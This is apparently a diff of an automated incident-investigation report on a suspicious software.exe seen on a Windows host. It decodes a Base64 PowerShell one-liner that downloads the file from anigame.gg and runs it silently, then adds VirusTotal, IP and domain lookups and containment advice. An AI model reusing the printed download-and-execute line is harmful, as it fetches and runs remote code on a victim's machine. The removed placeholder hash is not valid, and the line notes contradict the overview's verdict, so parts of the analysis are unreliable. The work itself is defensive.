@@ -2,234 +2,466 @@
 
 --- Step 1: Detection Analysis ---
 {
-  "detection": {
-    "detection_id": "DETECT-2024-10-05-001",
-    "timestamp": "2024-10-05T14:35:27Z",
-    "severity_level": "High",
-    "alert_source": "Endpoint Security Agent v3.2.1",
-    "hostname": "WIN-SERVER-01",
-    "operating_system": "Windows Server 2019",
-    "detection_method": "Behavioral Analysis",
-    "incident_details": {
-      "detection_type": "Unauthorized Ransomware Activity",
-      "description": "An anomalous process exhibiting ransomware-like behavior was detected on the host. The process attempted to encrypt multiple files across various directories, modifying file extensions and appending .encrypted to filenames. Immediate action is recommended to contain and remediate the threat."
-    },
-    "indicators_of_compromise": {
-      "process_name": "encryptor.exe",
-      "process_id": 4821,
-      "process_path": "C:\\Users\\Public\\Downloads\\encryptor.exe",
-      "parent_process": {
-        "name": "explorer.exe",
-        "pid": 1568
-      },
-      "file_hash": {
-        "sha256": "3A7F1E2B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1T2U3V4W5X6Y7Z8A9B0C1D"
-      },
-      "network_activity": {
-        "outbound_connection": {
-          "ip": "13.224.189.18",
-          "port": 443
-        }
-      },
-      "registry_changes": [
-        {
-          "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-          "action": "added"
-        }
-      ],
-      "affected_files": [
-        ".docx",
-        ".xlsx",
-        ".pptx"
-      ],
-      "affected_directory": "C:\\Users\\Public\\Documents"
+  "Detection INformation": "Seen executing on a windows host",
+  "File Name": "software.exe",
+  "File Hash": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+  "IP Address": "13.224.189.18",
+  "Powershell": "JHNvdXJjZT0iaHR0cHM6Ly9hbmlnYW1lLmdnLi9zb2Z0d2FyZS5leGUiOyAkZGVzdD0iQzpcdG1wXHNvZnR3YXJlLmV4ZSI7ICRoYXNoPSJBQkNERUYxMjM0NTY3ODkwLi4uIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc291cmNlIC1PdXRGaWxlICRkZXN0OyBpZiAoKEdldC1GaWxlSGFzaCAkZGVzdCAtQWxnb3JpdGhtIFNIQTI1NikuSGFzaCAtZXEgJGhhc2gpIHsgU3RhcnQtTXBTY2FuIC1TY2FuUGF0aCAkZGVzdCAtU2NhblR5cGUgUXVpY2tTY2FuOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdCAtQXJndW1lbnRMaXN0ICIvc2lsZW50IiAtV2FpdCB9IGVsc2UgeyBXcml0ZS1FcnJvciAiSGFzaCBtaXNtYXRjaCEiIH0NCg=="
+}
+
+--- Step 1.5: Base64 Decoding ---
+{
+  "Detection INformation": "Seen executing on a windows host",
+  "File Name": "software.exe",
+  "File Hash": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+  "IP Address": "13.224.189.18",
+  "Powershell": "JHNvdXJjZT0iaHR0cHM6Ly9hbmlnYW1lLmdnLi9zb2Z0d2FyZS5leGUiOyAkZGVzdD0iQzpcdG1wXHNvZnR3YXJlLmV4ZSI7ICRoYXNoPSJBQkNERUYxMjM0NTY3ODkwLi4uIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc291cmNlIC1PdXRGaWxlICRkZXN0OyBpZiAoKEdldC1GaWxlSGFzaCAkZGVzdCAtQWxnb3JpdGhtIFNIQTI1NikuSGFzaCAtZXEgJGhhc2gpIHsgU3RhcnQtTXBTY2FuIC1TY2FuUGF0aCAkZGVzdCAtU2NhblR5cGUgUXVpY2tTY2FuOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdCAtQXJndW1lbnRMaXN0ICIvc2lsZW50IiAtV2FpdCB9IGVsc2UgeyBXcml0ZS1FcnJvciAiSGFzaCBtaXNtYXRjaCEiIH0NCg==",
+  "base64_decoded": [
+    {
+      "field": "Powershell",
+      "original": "JHNvdXJjZT0iaHR0cHM6Ly9hbmlnYW1lLmdnLi9zb2Z0d2FyZS5leGUiOyAkZGVzdD0iQzpcdG1wXHNvZnR3YXJlLmV4ZSI7ICRoYXNoPSJBQkNERUYxMjM0NTY3ODkwLi4uIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc291cmNlIC1PdXRGaWxlICRkZXN0OyBpZiAoKEdldC1GaWxlSGFzaCAkZGVzdCAtQWxnb3JpdGhtIFNIQTI1NikuSGFzaCAtZXEgJGhhc2gpIHsgU3RhcnQtTXBTY2FuIC1TY2FuUGF0aCAkZGVzdCAtU2NhblR5cGUgUXVpY2tTY2FuOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdCAtQXJndW1lbnRMaXN0ICIvc2lsZW50IiAtV2FpdCB9IGVsc2UgeyBXcml0ZS1FcnJvciAiSGFzaCBtaXNtYXRjaCEiIH0NCg==",
+      "decoded": "$source=\"https://anigame.gg./software.exe\"; $dest=\"C:\\tmp\\software.exe\"; $hash=\"ABCDEF1234567890...\"; Invoke-WebRequest -Uri $source -OutFile $dest; if ((Get-FileHash $dest -Algorithm SHA256).Hash -eq $hash) { Start-MpScan -ScanPath $dest -ScanType QuickScan; Start-Process -FilePath $dest -ArgumentList \"/silent\" -Wait } else { Write-Error \"Hash mismatch!\" }\r\n",
+      "context": "JHNvdXJjZT0iaHR0cHM6Ly9hbmlnYW1lLmdnLi9zb2Z0d2FyZS5leGUiOyAkZGVzdD0iQzpcdG1wXHNvZnR3YXJlLmV4ZSI7ICRoYXNoPSJBQkNERUYxMjM0NTY3ODkwLi4uIjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc291cmNlIC1PdXRGaWxlICRkZXN0OyBpZiAoKEdldC1GaWxlSGFzaCAkZGVzdCAtQWxnb3JpdGhtIFNIQTI1NikuSGFzaCAtZXEgJGhhc2gpIHsgU3RhcnQtTXBTY2FuIC1TY2FuUGF0aCAkZGVzdCAtU2NhblR5cGUgUXVpY2tTY2FuOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkZGVzdCAtQXJndW1lbnRMaXN0ICIvc2lsZW50IiAtV2FpdCB9IGVsc2UgeyBXcml0ZS1FcnJvciAiSGFzaCBtaXNtYXRjaCEiIH0NCg==",
+      "analysis": {
+        "1": "$source=\"https://anigame.gg./software.exe\";",
+        "1_explanation": "This line initializes a variable named 'source' and assigns it the URL of the software that is intended to be downloaded. The URL indicates that it points to an executable file, 'software.exe', hosted on the domain 'anigame.gg'. The use of 'https' suggests that the connection is encrypted, providing some level of security during the download process.",
+        "2": "$dest=\"C:\\tmp\\software.exe\";",
+        "2_explanation": "This line sets another variable named 'dest' which specifies the file path where the downloaded executable will be stored on the local system. In this case, it will be stored in the 'C:\\tmp' directory, which is typically used for temporary files. The use of double backslashes is necessary in PowerShell to escape the backslash character.",
+        "3": "$hash=\"ABCDEF1234567890...\";",
+        "3_explanation": "This line defines a variable called 'hash', which is presumably a SHA-256 hash value representing the expected hash of the downloaded executable. The '...' suggests that this hash is truncated in the output, but its purpose is to ensure the integrity of the downloaded file by comparing it against the actual hash after download.",
+        "4": "Invoke-WebRequest -Uri $source -OutFile $dest;",
+        "4_explanation": "This line uses the 'Invoke-WebRequest' cmdlet in PowerShell to download the executable file from the specified URL (stored in $source) and save it to the location indicated by $dest. This command is crucial for fetching the file from the internet.",
+        "5": "if ((Get-FileHash $dest -Algorithm SHA256).Hash -eq $hash) {",
+        "5_explanation": "This line begins a conditional statement that checks whether the SHA-256 hash of the downloaded file (obtained via 'Get-FileHash') matches the expected hash stored in the $hash variable. This is an important check to verify file authenticity and integrity, ensuring the file has not been tampered with during download.",
+        "6": "Start-MpScan -ScanPath $dest -ScanType QuickScan;",
+        "6_explanation": "If the hash matches, this line triggers a quick scan of the downloaded executable using Windows Defender (or Microsoft Defender). The 'Start-MpScan' cmdlet initiates a security scan on the specified path to identify any potential malware present in the file.",
+        "7": "Start-Process -FilePath $dest -ArgumentList \"/silent\" -Wait } else {",
+        "7_explanation": "This line, which executes only if the hash check is successful, starts the downloaded software using the 'Start-Process' cmdlet. The '/silent' argument suggests that the software should be executed without user interaction or visible prompts. The 'Wait' parameter ensures that the script waits for the process to close before continuing. The '}' indicates the end of the if statement.",
+        "8": "Write-Error \"Hash mismatch!\"",
+        "8_explanation": "This line executes if the hash check fails, meaning the downloaded file\u2019s integrity check was not successful. It logs an error message stating 'Hash mismatch!', alerting users that the file may be corrupted or altered, and therefore cannot be trusted."
+      }
     }
-  }
+  ]
 }
 
 --- Step 2: OSINT Investigation Plan ---
 {
   "step_1": {
-    "title": "Analyze File Hash in Threat Intelligence Databases",
-    "description": "Search the provided file hash in public threat intelligence databases to identify if the file has been reported as malicious and gather additional information on its behavior and associated campaigns.",
-    "ioc": "3A7F1E2B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1T2U3V4W5X6Y7Z8A9B0C1D",
+    "title": "Analyze File Hash on VirusTotal",
+    "description": "Use VirusTotal to get detailed information on the file hash. This will provide insights into known malicious activities associated with the file.",
+    "ioc": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
     "ioc_type": "File Hash",
+    "tool": {
+      "name": "get_virustotal_report"
+    },
     "resources": [
       {
         "name": "VirusTotal",
         "url": "https://www.virustotal.com/"
-      },
-      {
-        "name": "Hybrid Analysis",
-        "url": "https://www.hybrid-analysis.com/"
-      },
-      {
-        "name": "Malware Bazaar",
-        "url": "https://bazaar.abuse.ch/"
       }
     ]
   },
   "step_2": {
-    "title": "Investigate the IP Address for Known Malicious Activity",
-    "description": "Investigate the outbound IP address to determine if it is associated with known malicious activities such as hosting ransomware C2 servers or other cyber threats.",
+    "title": "Check IP Address Reputation",
+    "description": "Verify the reputation of the IP address using available threat intelligence sources. Check for any indicators of malicious activity associated with this IP.",
     "ioc": "13.224.189.18",
     "ioc_type": "IP Address",
+    "tool": {
+      "name": "check_ip_reputation"
+    },
     "resources": [
       {
-        "name": "AlienVault OTX",
+        "name": "IPVoid",
+        "url": "https://www.ipvoid.com/"
+      },
+      {
+        "name": "AlienVault Open Threat Exchange (OTX)",
         "url": "https://otx.alienvault.com/"
-      },
-      {
-        "name": "Talos Intelligence",
-        "url": "https://talosintelligence.com/"
-      },
-      {
-        "name": "AbuseIPDB",
-        "url": "https://www.abuseipdb.com/"
       }
     ]
   },
   "step_3": {
-    "title": "Research Process Names in Public Repositories",
-    "description": "Search for the process name 'encryptor.exe' in public repositories to find references in malware analysis reports, user forums, or security blogs.",
-    "ioc": "encryptor.exe",
-    "ioc_type": "Process Name",
+    "title": "Geolocate IP Address",
+    "description": "Determine the geographic location of the IP address to understand potential attribution or point of origin of malicious activity.",
+    "ioc": "13.224.189.18",
+    "ioc_type": "IP Address",
+    "tool": {
+      "name": "get_geolocation"
+    },
     "resources": [
       {
-        "name": "GitHub",
-        "url": "https://github.com/"
+        "name": "ipgeolocation",
+        "url": "https://ipgeolocation.io/"
       },
       {
-        "name": "BleepingComputer Forums",
-        "url": "https://www.bleepingcomputer.com/forums/"
-      },
-      {
-        "name": "Malwarebytes Labs",
-        "url": "https://blog.malwarebytes.com/"
+        "name": "MaxMind GeoIP2",
+        "url": "https://www.maxmind.com/en/geoip2-services-and-databases"
       }
     ]
   },
   "step_4": {
-    "title": "Search for Registry Key Changes Related to Ransomware",
-    "description": "Investigate the registry key modification to determine if it is a common tactic used by ransomware for persistence in the Windows operating system.",
-    "ioc": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-    "ioc_type": "Registry Key",
+    "title": "Investigate Domain Reputation",
+    "description": "Perform an online search to investigate the reputation and any known reports of malicious activity for the domain 'anigame.gg'.",
+    "ioc": "anigame.gg",
+    "ioc_type": "Domain",
+    "tool": {
+      "name": "advanced_search"
+    },
     "resources": [
       {
-        "name": "MITRE ATT&CK",
-        "url": "https://attack.mitre.org/"
+        "name": "DomainTools",
+        "url": "https://www.domaintools.com/"
       },
       {
-        "name": "Capec",
-        "url": "https://capec.mitre.org/"
-      },
-      {
-        "name": "Sysinternals Autoruns",
-        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns"
+        "name": "WHOIS Lookup",
+        "url": "https://whois.domaintools.com/"
       }
     ]
   },
   "step_5": {
-    "title": "Gather Context on Affected File Types in Ransomware Attacks",
-    "description": "Research typical ransomware attacks that target specific file types such as .docx, .xlsx, and .pptx to identify common ransomware strains and tactics.",
-    "ioc": ".docx, .xlsx, .pptx",
-    "ioc_type": "Affected File Types",
+    "title": "Search for Related Threat Reports",
+    "description": "Use advanced Google searches to find threat reports or news articles related to the IOCs. Summarize key findings from the top results.",
+    "ioc": "software.exe, anigame.gg, 13.224.189.18",
+    "ioc_type": "Various",
+    "tool": {
+      "name": "advanced_search"
+    },
     "resources": [
       {
-        "name": "No More Ransom Project",
-        "url": "https://www.nomoreransom.org/"
+        "name": "Google",
+        "url": "https://www.google.com/"
       },
       {
-        "name": "Kaspersky Threat Intelligence Portal",
-        "url": "https://opentip.kaspersky.com/"
+        "name": "VirusTotal Community",
+        "url": "https://www.virustotal.com/gui/community"
+      }
+    ]
+  }
+}
+--- step_1: Analyze File Hash on VirusTotal ---
+{
+  "title": "Analyze File Hash on VirusTotal",
+  "description": "Use VirusTotal to get detailed information on the file hash. This will provide insights into known malicious activities associated with the file.",
+  "ioc": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+  "ioc_type": "File Hash",
+  "tool": {
+    "name": "get_virustotal_report"
+  },
+  "resources": [
+    {
+      "name": "VirusTotal",
+      "url": "https://www.virustotal.com/"
+    }
+  ],
+  "report": {
+    "scan_date": 1719811931,
+    "total_scans": 78,
+    "malicious": 65,
+    "suspicious": 0,
+    "undetected": 9,
+    "file_type": "Win32 EXE",
+    "file_size": 212332,
+    "md5": "53f871aaecae2eabc299452bd7872f4f",
+    "sha1": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+    "sha256": "8354e3050cd540d0731cd0d5538a0bf1f9bb503bf2240a32cdc09c46aee1770c"
+  }
+}
+
+--- step_2: Check IP Address Reputation ---
+{
+  "title": "Check IP Address Reputation",
+  "description": "Verify the reputation of the IP address using available threat intelligence sources. Check for any indicators of malicious activity associated with this IP.",
+  "ioc": "13.224.189.18",
+  "ioc_type": "IP Address",
+  "tool": {
+    "name": "check_ip_reputation"
+  },
+  "resources": [
+    {
+      "name": "IPVoid",
+      "url": "https://www.ipvoid.com/"
+    },
+    {
+      "name": "AlienVault Open Threat Exchange (OTX)",
+      "url": "https://otx.alienvault.com/"
+    }
+  ]
+}
+
+--- step_3: Geolocate IP Address ---
+{
+  "title": "Geolocate IP Address",
+  "description": "Determine the geographic location of the IP address to understand potential attribution or point of origin of malicious activity.",
+  "ioc": "13.224.189.18",
+  "ioc_type": "IP Address",
+  "tool": {
+    "name": "get_geolocation"
+  },
+  "resources": [
+    {
+      "name": "ipgeolocation",
+      "url": "https://ipgeolocation.io/"
+    },
+    {
+      "name": "MaxMind GeoIP2",
+      "url": "https://www.maxmind.com/en/geoip2-services-and-databases"
+    }
+  ]
+}
+
+--- step_4: Investigate Domain Reputation ---
+{
+  "title": "Investigate Domain Reputation",
+  "description": "Perform an online search to investigate the reputation and any known reports of malicious activity for the domain 'anigame.gg'.",
+  "ioc": "anigame.gg",
+  "ioc_type": "Domain",
+  "tool": {
+    "name": "advanced_search"
+  },
+  "resources": [
+    {
+      "name": "DomainTools",
+      "url": "https://www.domaintools.com/"
+    },
+    {
+      "name": "WHOIS Lookup",
+      "url": "https://whois.domaintools.com/"
+    }
+  ],
+  "search_results": {
+    "status": "No results found.",
+    "details": "An online search did not yield any results related to the reputation or malicious activity for the domain 'anigame.gg'."
+  },
+  "reputation_checks": {
+    "ip_reputation": {
+      "status": "Error",
+      "message": "Invalid IP"
+    },
+    "geolocation": {
+      "status": "Error",
+      "message": "Invalid IP"
+    }
+  }
+}
+
+--- step_5: Search for Related Threat Reports ---
+{
+  "title": "Search for Related Threat Reports",
+  "description": "Use advanced Google searches to find threat reports or news articles related to the IOCs. Summarize key findings from the top results.",
+  "ioc": "software.exe, anigame.gg, 13.224.189.18",
+  "ioc_type": "Various",
+  "results": [
+    {
+      "ioc": "software.exe",
+      "summary": {
+        "title": "Is OneLaunch Malware? : r/GeekSquad",
+        "content": "The post discusses the software 'OneLaunch' and whether it is malicious. Although it is related to the query about 'software.exe', specific details are inaccessible.",
+        "source": "Reddit",
+        "url": "https://www.reddit.com/r/GeekSquad/comments/11ab6h2/is_onelaunch_malware/"
+      }
+    },
+    {
+      "ioc": "anigame.gg",
+      "summary": {
+        "message": "No specific threat reports or news were found regarding 'anigame.gg'. The scraping process encountered restrictions on social media, leading to insufficient information.",
+        "source": "Reddit",
+        "url": "https://www.reddit.com/r/anigame/"
+      }
+    },
+    {
+      "ioc": "13.224.189.18",
+      "summary": {
+        "key_information": {
+          "domain": "cdn.boomtrain.com",
+          "location": "United States",
+          "creation_date": "March 17th, 2011",
+          "other_ip_addresses": [
+            "18.66.122.57",
+            "18.66.122.29",
+            "18.66.122.42"
+          ],
+          "recent_scans": 31,
+          "incoming_hits": "Details not specified",
+          "related_infrastructure": "List of other associated IPs and domains available",
+          "screenshots": "Several screenshots of pages hosted on the domain available"
+        },
+        "source": "urlscan.io",
+        "url": "https://urlscan.io/domain/cdn.boomtrain.com"
+      }
+    }
+  ],
+  "resources": [
+    {
+      "name": "Google",
+      "url": "https://www.google.com/"
+    },
+    {
+      "name": "VirusTotal Community",
+      "url": "https://www.virustotal.com/gui/community"
+    }
+  ]
+}
+
+
+--- Step 3: Investigation Results ---
+{
+  "step_1": {
+    "title": "Analyze File Hash on VirusTotal",
+    "description": "Use VirusTotal to get detailed information on the file hash. This will provide insights into known malicious activities associated with the file.",
+    "ioc": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+    "ioc_type": "File Hash",
+    "tool": {
+      "name": "get_virustotal_report"
+    },
+    "resources": [
+      {
+        "name": "VirusTotal",
+        "url": "https://www.virustotal.com/"
+      }
+    ],
+    "report": {
+      "scan_date": 1719811931,
+      "total_scans": 78,
+      "malicious": 65,
+      "suspicious": 0,
+      "undetected": 9,
+      "file_type": "Win32 EXE",
+      "file_size": 212332,
+      "md5": "53f871aaecae2eabc299452bd7872f4f",
+      "sha1": "1d31bd48b2e864c773ca6a3b9fd0019416809066",
+      "sha256": "8354e3050cd540d0731cd0d5538a0bf1f9bb503bf2240a32cdc09c46aee1770c"
+    }
+  },
+  "step_2": {
+    "title": "Check IP Address Reputation",
+    "description": "Verify the reputation of the IP address using available threat intelligence sources. Check for any indicators of malicious activity associated with this IP.",
+    "ioc": "13.224.189.18",
+    "ioc_type": "IP Address",
+    "tool": {
+      "name": "check_ip_reputation"
+    },
+    "resources": [
+      {
+        "name": "IPVoid",
+        "url": "https://www.ipvoid.com/"
+      },
+      {
+        "name": "AlienVault Open Threat Exchange (OTX)",
+        "url": "https://otx.alienvault.com/"
+      }
+    ]
+  },
+  "step_3": {
+    "title": "Geolocate IP Address",
+    "description": "Determine the geographic location of the IP address to understand potential attribution or point of origin of malicious activity.",
+    "ioc": "13.224.189.18",
+    "ioc_type": "IP Address",
+    "tool": {
+      "name": "get_geolocation"
+    },
+    "resources": [
+      {
+        "name": "ipgeolocation",
+        "url": "https://ipgeolocation.io/"
+      },
+      {
+        "name": "MaxMind GeoIP2",
+        "url": "https://www.maxmind.com/en/geoip2-services-and-databases"
+      }
+    ]
+  },
+  "step_4": {
+    "title": "Investigate Domain Reputation",
+    "description": "Perform an online search to investigate the reputation and any known reports of malicious activity for the domain 'anigame.gg'.",
+    "ioc": "anigame.gg",
+    "ioc_type": "Domain",
+    "tool": {
+      "name": "advanced_search"
+    },
+    "resources": [
+      {
+        "name": "DomainTools",
+        "url": "https://www.domaintools.com/"
+      },
+      {
+        "name": "WHOIS Lookup",
+        "url": "https://whois.domaintools.com/"
+      }
+    ],
+    "search_results": {
+      "status": "No results found.",
+      "details": "An online search did not yield any results related to the reputation or malicious activity for the domain 'anigame.gg'."
+    },
+    "reputation_checks": {
+      "ip_reputation": {
+        "status": "Error",
+        "message": "Invalid IP"
+      },
+      "geolocation": {
+        "status": "Error",
+        "message": "Invalid IP"
+      }
+    }
+  },
+  "step_5": {
+    "title": "Search for Related Threat Reports",
+    "description": "Use advanced Google searches to find threat reports or news articles related to the IOCs. Summarize key findings from the top results.",
+    "ioc": "software.exe, anigame.gg, 13.224.189.18",
+    "ioc_type": "Various",
+    "results": [
+      {
+        "ioc": "software.exe",
+        "summary": {
+          "title": "Is OneLaunch Malware? : r/GeekSquad",
+          "content": "The post discusses the software 'OneLaunch' and whether it is malicious. Although it is related to the query about 'software.exe', specific details are inaccessible.",
+          "source": "Reddit",
+          "url": "https://www.reddit.com/r/GeekSquad/comments/11ab6h2/is_onelaunch_malware/"
+        }
+      },
+      {
+        "ioc": "anigame.gg",
+        "summary": {
+          "message": "No specific threat reports or news were found regarding 'anigame.gg'. The scraping process encountered restrictions on social media, leading to insufficient information.",
+          "source": "Reddit",
+          "url": "https://www.reddit.com/r/anigame/"
+        }
+      },
+      {
+        "ioc": "13.224.189.18",
+        "summary": {
+          "key_information": {
+            "domain": "cdn.boomtrain.com",
+            "location": "United States",
+            "creation_date": "March 17th, 2011",
+            "other_ip_addresses": [
+              "18.66.122.57",
+              "18.66.122.29",
+              "18.66.122.42"
+            ],
+            "recent_scans": 31,
+            "incoming_hits": "Details not specified",
+            "related_infrastructure": "List of other associated IPs and domains available",
+            "screenshots": "Several screenshots of pages hosted on the domain available"
+          },
+          "source": "urlscan.io",
+          "url": "https://urlscan.io/domain/cdn.boomtrain.com"
+        }
+      }
+    ],
+    "resources": [
+      {
+        "name": "Google",
+        "url": "https://www.google.com/"
+      },
+      {
+        "name": "VirusTotal Community",
+        "url": "https://www.virustotal.com/gui/community"
       }
     ]
   }
 }
 
---- Step 3: Investigation Results ---
+--- Step 5: Report Overview ---
 {
-  "investigation_results": {
-    "step_1": {
-      "title": "Analyze File Hash in Threat Intelligence Databases",
-      "description": "Search the provided file hash in public threat intelligence databases to identify if the file has been reported as malicious and gather additional information on its behavior and associated campaigns.",
-      "ioc": "3A7F1E2B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1T2U3V4W5X6Y7Z8A9B0C1D",
-      "ioc_type": "File Hash",
-      "results": {
-        "VirusTotal": {},
-        "Hybrid Analysis": {},
-        "Malware Bazaar": {}
-      }
-    },
-    "step_2": {
-      "title": "Investigate the IP Address for Known Malicious Activity",
-      "description": "Investigate the outbound IP address to determine if it is associated with known malicious activities such as hosting ransomware C2 servers or other cyber threats.",
-      "ioc": "13.224.189.18",
-      "ioc_type": "IP Address",
-      "results": {
-        "reputation": {
-          "ip": "13.224.189.18",
-          "organization": "Amazon.com, Inc.",
-          "country": "Germany",
-          "city": "M\u00f6rfelden-Walldorf",
-          "open_ports": [
-            80,
-            443
-          ],
-          "vulns": [],
-          "last_update": "2024-10-05T03:49:15.499105",
-          "hostnames": [
-            "server-13-224-189-18.fra2.r.cloudfront.net"
-          ],
-          "domains": [
-            "cloudfront.net"
-          ],
-          "reputation": "Low Risk"
-        },
-        "geolocation": {
-          "ip": "13.224.189.18",
-          "country": "Germany",
-          "country_code": "DE",
-          "city": "M\u00f6rfelden-Walldorf",
-          "region_code": "HE",
-          "latitude": 49.99472,
-          "longitude": 8.58361,
-          "isp": "Amazon.com, Inc.",
-          "asn": "AS16509"
-        }
-      }
-    },
-    "step_3": {
-      "title": "Research Process Names in Public Repositories",
-      "description": "Search for the process name 'encryptor.exe' in public repositories to find references in malware analysis reports, user forums, or security blogs.",
-      "ioc": "encryptor.exe",
-      "ioc_type": "Process Name",
-      "results": {
-        "GitHub": {},
-        "BleepingComputer Forums": {},
-        "Malwarebytes Labs": {}
-      }
-    },
-    "step_4": {
-      "title": "Search for Registry Key Changes Related to Ransomware",
-      "description": "Investigate the registry key modification to determine if it is a common tactic used by ransomware for persistence in the Windows operating system.",
-      "ioc": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-      "ioc_type": "Registry Key",
-      "results": {
-        "MITRE ATT&CK": {},
-        "Capec": {},
-        "Sysinternals Autoruns": {}
-      }
-    },
-    "step_5": {
-      "title": "Gather Context on Affected File Types in Ransomware Attacks",
-      "description": "Research typical ransomware attacks that target specific file types such as .docx, .xlsx, and .pptx to identify common ransomware strains and tactics.",
-      "ioc": ".docx, .xlsx, .pptx",
-      "ioc_type": "Affected File Types",
-      "results": {
-        "No More Ransom Project": {},
-        "Kaspersky Threat Intelligence Portal": {}
-      }
-    }
-  }
+  "overview": "## Cybersecurity Investigation Overview: Suspicious software.exe Execution\n\n**1. Executive Summary:**\n\nThis report analyzes a security incident involving the execution of a suspicious file, \"software.exe,\" on a Windows host. The investigation involved decoding a Base64-encoded PowerShell script, analyzing the file's hash on VirusTotal, investigating the associated IP address and domain, and searching for related threat reports. The analysis reveals a high likelihood of malicious activity, given the high VirusTotal detection rate and the obfuscated nature of the PowerShell script used for download and execution.  Further investigation is warranted to determine the exact nature of the threat and its impact.\n\n**2. Key Findings:**\n\n* **Malicious PowerShell Script:** A Base64-encoded PowerShell script was discovered.  The decoded script downloads \"software.exe\" from `anigame.gg`, calculates its SHA256 hash, compares it to a hardcoded value, performs a quick scan with Windows Defender, and then executes the file silently if the hash matches. The use of obfuscation and a hash check suggests an attempt to evade detection and ensure execution of a specific version of the malicious software.\n* **High VirusTotal Detection Rate:** The file hash (SHA1: 1d31bd48b2e864c773ca6a3b9fd0019416809066) has a high detection rate (65/78) on VirusTotal, strongly indicating malicious intent.\n* **Suspicious Domain:** The domain `anigame.gg` used to host the malicious file returned no results in reputation checks, possibly indicating a newly registered domain specifically for malicious purposes or a domain with a very low profile.\n* **Limited IP Information:** While the IP address 13.224.189.18 was flagged for investigation, the OSINT investigation yielded limited direct information about it. The provided report shows an error in processing this IP address for reputation and geolocation. However, the subsequent search for threat reports linked the IP to `cdn.boomtrain.com`, a domain located in the United States. This connection requires further scrutiny.\n* **Potentially Related Software:**  A search for \"software.exe\" yielded a discussion about \"OneLaunch\" software and its potential malicious nature. This might be a coincidence, but warrants further investigation to rule out any connection.\n\n**3. Potential Threats:**\n\n* **Malware Infection:** The high VirusTotal detection rate and the surreptitious nature of the PowerShell script strongly suggest that \"software.exe\" is malware.  The specific type of malware is unknown but could range from ransomware, spyware, or a botnet client.\n* **Data Breach:** Depending on the malware's functionality, sensitive data could be exfiltrated from the infected host.\n* **System Compromise:** The malware could compromise the host system, allowing attackers to gain control and potentially use it for further malicious activities.\n* **Lateral Movement:**  The compromised host could be used as a pivot point for attacks on other systems within the network.\n\n**4. Recommended Actions:**\n\n* **Isolate the Infected Host:** Immediately isolate the infected host from the network to prevent further spread of the malware.\n* **Full System Scan:** Conduct a thorough scan of the infected host using multiple reputable antivirus and anti-malware solutions.\n* **Memory Forensics:** Perform memory forensics to identify any running malicious processes and further analyze the malware's behavior.\n* **Network Traffic Analysis:** Analyze network traffic logs to identify any communication between the infected host and external servers. This can help determine command and control infrastructure and data exfiltration.\n* **Domain and IP Investigation:** Conduct a deeper investigation into the domain `anigame.gg` and the IP address 13.224.189.18 using various threat intelligence platforms and tools.  Focus on identifying any related infrastructure and past malicious activity.\n* **Block the Malicious Domain and IP:** Block the domain `anigame.gg` and the IP address 13.224.189.18 at the firewall and other network security devices to prevent further infections.\n* **Review Security Controls:** Review existing security controls and identify any weaknesses that allowed the malware to bypass defenses.  Implement necessary improvements to prevent similar incidents in the future.\n* **User Education:** Educate users about the risks of downloading and executing files from untrusted sources and the importance of reporting suspicious activity.\n\n**5. Conclusion:**\n\nThe evidence strongly suggests a malware infection facilitated by a sophisticated PowerShell script. The investigation revealed several key indicators of compromise, requiring immediate action to contain the threat and mitigate potential damage. Further investigation is crucial to fully understand the scope and impact of the incident and to improve security posture against future threats.  The lack of clear information on the domain and IP address highlights the need for more robust threat intelligence gathering and analysis.\n"
 }
